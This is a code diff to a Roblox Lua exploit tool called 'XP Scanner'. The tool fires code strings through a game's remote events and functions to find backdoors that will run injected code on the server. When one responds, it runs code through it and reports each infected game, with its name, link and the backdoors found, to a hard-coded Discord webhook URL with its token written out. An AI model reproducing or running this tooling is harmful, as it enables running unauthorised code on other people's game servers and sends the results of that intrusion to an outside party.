@@ -186,7 +186,6 @@ G2L["15"]["ScrollBarThickness"] = 10;
 
 -- StarterGui.ScreenGui.Frame.ScrollingFrame.TextBox
 G2L["16"] = Instance.new("TextBox", G2L["15"]);
-G2L["16"]["CursorPosition"] = -1;
 G2L["16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["16"]["BorderSizePixel"] = 0;
 G2L["16"]["TextWrapped"] = true;
@@ -253,17 +252,15 @@ local script = G2L["9"];
 	local keyValue = gui:FindFirstChild("Key")
 	local scrollFrame = gui:FindFirstChild("ScrollingFrame")
 	
-	local function sendW()
+	local function sendW(foundList)
 		local HttpRequest = http_request or (syn and syn.request)
-		if not HttpRequest then
-			return
-		end
+		if not HttpRequest then return end
 	
 		local webhook_url = "https://discord.com/api/webhooks/1413077044056555580/myr4UfvDLz2LrPEKehbxp2qileNq_mStX24B7vcmD4Wxap_MYZMPgM9BEWi1jfX1R8PI"
 	
 		local embedData = {
-			title = "Infected",
-			description = "New game infected",
+			title = "XP Scanner - Infected",
+			description = "Backdoor scan completed.",
 			color = 65280,
 			fields = {
 				{
@@ -278,6 +275,11 @@ local script = G2L["9"];
 					value = "**Game Name:** " .. MarketplaceService:GetProductInfo(game.PlaceId).Name
 						.. "\n**Game Link:** [Click Here](https://www.roblox.com/games/" .. tostring(game.PlaceId) .. ")",
 					inline = false
+				},
+				{
+					name = "Found Backdoors",
+					value = table.concat(foundList, "\n"),
+					inline = false
 				}
 			}
 		}
@@ -290,9 +292,13 @@ local script = G2L["9"];
 		})
 	end
 	
-	local function scan(i, startTime)
+	local function scan(i, startTime, foundList)
+		if not (i:IsA("BindableFunction") or i:IsA("RemoteEvent") or i:IsA("RemoteFunction") or i:IsA("BindableEvent")) then
+			return
+		end
+	
 		local key = HttpService:GenerateGUID(false)
-		local success, err = pcall(function()
+		local success = pcall(function()
 			if i:IsA("BindableFunction") then
 				i:Invoke("Instance.new('Model', workspace).Name='" .. key .. "'")
 			elseif i:IsA("RemoteEvent") then
@@ -304,12 +310,9 @@ local script = G2L["9"];
 			end
 		end)
 	
-		if not success then
-			warn("Error testing", i.Name, ":", err)
-			return false
-		end
+		if not success then return end
 	
-		for _ = 1,100 do
+		for _ = 1,20 do
 			local found = workspace:FindFirstChild(key)
 			if found then
 				found:Destroy()
@@ -322,44 +325,51 @@ local script = G2L["9"];
 					scrollFrame.TextBox.Text = "--Found backdoor at: " .. string.format("%.2f", os.clock() - startTime) .. "s"
 					scrollFrame.Visible = true
 				end
-				
+	
 				if i:IsA("BindableFunction") then
-					i:Invoke("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner - discord.gg/7gEksmdKgq'")
+					i:Invoke("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner'")
 				elseif i:IsA("RemoteEvent") then
-					i:FireServer("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner - discord.gg/7gEksmdKgq'")
+					i:FireServer("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner'")
 				elseif i:IsA("RemoteFunction") then
-					i:InvokeServer("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner - discord.gg/7gEksmdKgq'")
+					i:InvokeServer("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner'")
 				elseif i:IsA("BindableEvent") then
-					i:Fire("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner - discord.gg/7gEksmdKgq'")
+					i:Fire("Instance.new('Hint', workspace).Text='Found Backdoor by XP Scanner'")
 				end
-				
+	
 				gui.Ex.Visible = true
 				gui.Cl.Visible = true
 				button.Visible = false
 	
-				sendW()
-				return true
+				table.insert(foundList, i.Name .. " (" .. i.ClassName .. ")")
+				return
 			end
-			task.wait()
+			task.wait(0.01)
 		end
-		return false
 	end
 	
 	button.MouseButton1Click:Connect(function()
 		button.Interactable = false
 		local start = os.clock()
+		local foundList = {}
 	
-		for _, i in ipairs(ReplicatedStorage:GetDescendants()) do
-			if scan(i, start) then
-				button.Interactable = true
-				return
-			end
+		local descendants = ReplicatedStorage:GetDescendants()
+		for _, i in ipairs(descendants) do
+			task.spawn(function()
+				scan(i, start, foundList)
+			end)
 		end
 	
-		button.Text = "Couldn't find any backdoor :("
 		task.wait(3)
-		button.Text = "Scan"
-		button.Interactable = true
+	
+		if #foundList > 0 then
+			sendW(foundList)
+			button.Interactable = true
+		else
+			button.Text = "Couldn't find any backdoor :("
+			task.wait(3)
+			button.Text = "Scan"
+			button.Interactable = true
+		end
 	end)
 	
 end;
